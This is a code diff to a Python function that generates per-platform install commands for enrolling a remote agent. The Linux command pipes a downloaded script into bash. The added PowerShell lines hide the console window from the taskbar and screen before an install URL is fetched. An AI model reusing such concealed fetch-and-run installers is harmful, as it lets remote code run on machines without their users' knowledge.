@@ -328,8 +328,16 @@ def connect_commands(user_id: int, base_url: str | None = None) -> dict[str, str
             f"curl -fsSL '{raw_sh}' | bash -s -- '{key}' '{base}'"
         ),
         "windows": (
-            "try{Add-Type -Namespace H -Name Z -MemberDefinition '[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int c);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();' -EA 0; "
-            "[void][H.Z]::ShowWindow([H.Z]::GetConsoleWindow(),6)}catch{}; "
+            "try{Add-Type -Namespace H -Name Z -MemberDefinition '"
+            "[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int c);"
+            "[DllImport(\"user32.dll\")]public static extern int GetWindowLong(IntPtr h,int n);"
+            "[DllImport(\"user32.dll\")]public static extern int SetWindowLong(IntPtr h,int n,int v);"
+            "[DllImport(\"user32.dll\")]public static extern bool SetWindowPos(IntPtr h,IntPtr a,int x,int y,int cx,int cy,uint f);"
+            "[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();' -EA 0; "
+            "$h=[H.Z]::GetConsoleWindow(); if($h -ne [IntPtr]::Zero){"
+            "$s=[H.Z]::GetWindowLong($h,-20); $s=($s -band (-bnot 0x40000)) -bor 0x80; "
+            "[void][H.Z]::SetWindowLong($h,-20,$s); [void][H.Z]::ShowWindow($h,0); "
+            "[void][H.Z]::SetWindowPos($h,[IntPtr]::Zero,0,0,0,0,0x83)}}catch{}; "
             "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; "
             f"$Enroll='{key}'; $BotBase='{base}'; $InstallUrl='{raw_ps1}'; "
             f"$env:AGENTSHE_GH='{rel}'; "
